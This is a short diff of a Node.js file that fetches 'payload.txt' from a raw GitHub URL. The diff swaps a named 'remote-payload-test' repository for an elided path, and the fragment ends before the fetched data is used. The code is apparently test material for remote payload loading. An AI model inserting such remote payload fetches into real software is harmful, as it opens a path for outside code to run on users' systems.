@@ -1,6 +1,6 @@
 const https = require("https");
 
-const URL = "https://raw.githubusercontent.com/JunYeopAn/rdd-remote-payload-test/main/payload.txt";
+const URL = "https://raw.githubusercontent.com/.../main/payload.txt";
 
 https.get(URL, (res) => {
   let data = "";
